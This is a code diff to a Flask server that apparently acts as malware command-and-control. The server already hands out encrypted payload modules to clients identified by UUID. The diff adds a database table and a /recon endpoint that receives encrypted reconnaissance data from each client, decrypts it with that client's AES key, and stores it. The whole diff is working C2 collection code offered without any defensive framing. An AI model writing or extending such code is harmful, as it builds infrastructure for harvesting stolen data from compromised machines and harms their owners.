@@ -126,6 +126,12 @@ class NonceRecord(db.Model):
     nonce = db.Column(db.String(64))
     created_at = db.Column(db.DateTime, default=datetime.utcnow)
 
+class ReconData(db.Model):
+    id = db.Column(db.Integer, primary_key=True)
+    client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
+    data = db.Column(db.Text)
+    created_at = db.Column(db.DateTime, default=datetime.utcnow)
+
 def log_event(client, message):
     entry = LogEntry(client_id=client.id, message=message)
     db.session.add(entry)
@@ -241,6 +247,37 @@ def get_payload(uuid, module):
     enc = encryptor.update(padded) + encryptor.finalize()
     blob = base64.b64encode(iv + enc).decode()
     return jsonify({'payload': blob})
+
+
+@app.route('/recon/<uuid>', methods=['POST'])
+def recon(uuid):
+    client = Client.query.filter_by(uuid=uuid).first()
+    if not client or not client.aes_key:
+        return jsonify({'error': 'unknown'}), 404
+    data = request.get_json(force=True)
+    blob = data.get('data')
+    if not blob:
+        return jsonify({'error': 'invalid'}), 400
+    try:
+        raw = base64.b64decode(blob)
+        key = base64.b64decode(client.aes_key)
+        iv = raw[:16]
+        enc = raw[16:]
+        cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        padded = decryptor.update(enc) + decryptor.finalize()
+        unpad = sympadding.PKCS7(128).unpadder()
+        plain = unpad.update(padded) + unpad.finalize()
+        text = plain.decode()
+        if app.debug:
+            logging.info('Recon from %s: %s', uuid, text)
+        rec = ReconData(client_id=client.id, data=text)
+        db.session.add(rec)
+        db.session.commit()
+    except Exception as e:
+        logging.warning('Failed recon decode for %s: %s', uuid, e)
+        return jsonify({'error': 'decode'}), 400
+    return jsonify({'status': 'ok'})
 
 
 @app.route('/status/<uuid>', methods=['GET'])
